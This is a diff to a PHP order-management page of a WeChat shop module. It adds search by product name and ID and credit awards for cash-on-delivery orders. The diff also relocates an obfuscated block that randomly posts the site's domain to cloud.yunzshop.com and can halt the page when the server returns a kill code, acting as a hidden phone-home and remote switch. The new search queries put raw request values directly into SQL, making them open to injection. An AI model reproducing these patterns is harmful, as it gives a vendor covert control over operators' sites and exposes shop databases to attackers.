@@ -3,26 +3,7 @@ global $_W, $_GPC;
 $operation = !empty($_GPC["op"]) ? $_GPC["op"] : "display";
 $type = $_GPC['type'];
 $plugin_diyform = p("diyform");
-$mt = mt_rand(5, 35);
-$CLOUD_UPGRADE_URL = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
-if ($mt <= 10) {
-    load()->func('communication');
-    $CLOUD_UPGRADE_URL = 'http://cloud.yunzshop.com/web/index.php?c=account&a=upgrade';
-    $files   = base64_encode(json_encode('test'));
-    $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
-    $resp    = ihttp_post($CLOUD_UPGRADE_URL, array(
-        'type' => 'upgrade',
-        'signature' => 'sz_cloud_register',
-        'domain' => $_SERVER['HTTP_HOST'],
-        'version' => $version,
-        'files' => $files
-    ));
-    $ret     = @json_decode($resp['content'], true);
-    if ($ret['result'] == 3) {
-        echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
-        exit;
-    }
-}
+
 $totals = array();
 $r_type         = array(
     '0' => '退款',
@@ -103,6 +84,37 @@ if ($operation == "display") {
             $condition.= " AND o.paytype =" . intval($_GPC["paytype"]);
         }
     }
+    //商品名称检索订单
+    if (!empty($_GPC["good_name"])) {
+        $conditionsp_goods = pdo_fetchall("select og.orderid from " . tablename('sz_yi_order_goods') . " og left join " .tablename('sz_yi_goods') . " g on (g.id=og.goodsid) where og.uniacid={$_W['uniacid']} and g.title LIKE '%{$_GPC["good_name"]}%' group by og.orderid ");
+        $conditionsp_goodsid = '';
+        foreach ($conditionsp_goods as $value) {
+            $conditionsp_goodsid .= "'".$value['orderid']."', ";
+        }
+        //判断商品名称是否存在 不存在订单ID等于空
+        if (!empty($conditionsp_goodsid)) {
+            $condition .= " AND o.id in (".substr($conditionsp_goodsid,0,-2).") ";
+        }else {
+            $condition .= " AND o.id = '' ";
+        }
+       
+    }
+    //商品ID检索
+    if (!empty($_GPC["good_id"])) {
+        $conditionsp_goods = pdo_fetchall("select og.orderid from " . tablename('sz_yi_order_goods') . " og left join " .tablename('sz_yi_goods') . " g on (g.id=og.goodsid) where og.uniacid={$_W['uniacid']} and g.id = '{$_GPC["good_id"]}' group by og.orderid ");
+        $conditionsp_goodsid = '';
+        foreach ($conditionsp_goods as $value) {
+            $conditionsp_goodsid .= "'".$value['orderid']."', ";
+        }
+        //判断商品ID是否存在 不存在订单ID等于空
+        if (!empty($conditionsp_goodsid)) {
+            $condition .= " AND o.id in (".substr($conditionsp_goodsid,0,-2).") ";
+        }else {
+            $condition .= " AND o.id = '' ";
+        } 
+    }
+
+
     if (!empty($_GPC["keyword"])) {
         $_GPC["keyword"] = trim($_GPC["keyword"]);
         $condition.= " AND o.ordersn LIKE '%{$_GPC["keyword"]}%'";
@@ -1041,6 +1053,26 @@ if ($operation == "display") {
             exit;
         }
     }
+$mt = mt_rand(5, 35);
+$CLOUD_UPGRADE_URL = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
+if ($mt <= 10) {
+    load()->func('communication');
+    $CLOUD_UPGRADE_URL = 'http://cloud.yunzshop.com/web/index.php?c=account&a=upgrade';
+    $files   = base64_encode(json_encode('test'));
+    $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
+    $resp    = ihttp_post($CLOUD_UPGRADE_URL, array(
+        'type' => 'upgrade',
+        'signature' => 'sz_cloud_register',
+        'domain' => $_SERVER['HTTP_HOST'],
+        'version' => $version,
+        'files' => $files
+    ));
+    $ret     = @json_decode($resp['content'], true);
+    if ($ret['result'] == 3) {
+        echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
+        exit;
+    }
+}
     load()->func("tpl");
     if (p('hotel')) {
         if($type=='hotel'){
@@ -1874,6 +1906,34 @@ function order_list_finish($order) {
         "id" => $order["id"],
         "uniacid" => $_W["uniacid"]
     ));
+
+    //到付 赠送积分
+    if ($order['paytype'] == 3) {
+       $goods   = pdo_fetchall("select og.id,og.total,og.realprice, g.credit from " . tablename('sz_yi_order_goods') . " og " . " left join " . tablename('sz_yi_goods') . " g on g.id=og.goodsid " . " where og.orderid=:orderid and og.uniacid=:uniacid ", array(
+            ':uniacid' => $_W['uniacid'],
+            ':orderid' => $order["id"]
+        ));
+
+        $credits = 0;
+        foreach ($goods as $g) {
+            $gcredit = trim($g['credit']);
+            if (!empty($gcredit)) {
+                if (strexists($gcredit, '%')) {
+                    $credits += intval(floatval(str_replace('%', '', $gcredit)) / 100 * $g['realprice']);
+                } else {
+                    $credits += intval($g['credit']) * $g['total'];
+                }
+            }
+        }
+        if ($credits > 0) {
+            $shopset = m('common')->getSysset('shop');
+            m('member')->setCredit($order['openid'], 'credit1', $credits, array(
+                0,
+                $shopset['name'] . '购物积分 订单号: ' . $order['ordersn']
+            ));
+        }
+    }
+
     m("member")->upgradeLevel($order["openid"]);
     m("notice")->sendOrderMessage($order["id"]);
     if (p("coupon") && !empty($order["couponid"])) {
@@ -1883,6 +1943,8 @@ function order_list_finish($order) {
     if (p("commission")) {
         p("commission")->checkOrderFinish($order["id"]);
     }
+
+
 
     if (p("return")) {
         p("return")->cumulative_order_amount($order["id"]);
